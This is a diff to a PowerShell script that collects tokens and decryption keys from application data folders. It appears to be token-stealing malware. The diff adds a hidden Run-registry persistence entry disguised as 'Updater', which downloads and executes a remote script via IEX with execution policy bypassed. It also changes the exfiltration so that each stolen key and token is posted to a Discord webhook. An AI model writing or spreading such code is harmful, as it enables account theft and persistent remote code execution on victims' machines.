@@ -1,3 +1,4 @@
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/active/1.ps1 -UseBasicParsing)"' -PropertyType String -Force
 $LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")
 $PATHS = @{
@@ -78,7 +79,13 @@ foreach ($platform in $PATHS.Keys) {
 
         try {
             $key = Get-Key -path $path
-            Invoke-WebRequest("http://127.0.0.1:8000/?token="+$token+"&key="+$key)
+            
+            $body = @{
+                content = "key:$key|token:$token|"
+            } | ConvertTo-Json
+            $webhook = "https://discord.com/api/webhooks/1371184261113184307/tH6uG3Gg9zQZhFNAK4D8wkWU7BKSSUnflRB-HjXejV-RliuhTQV4AfGUPaiISTFcRw88"
+            Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+
         } catch {
             continue
         }
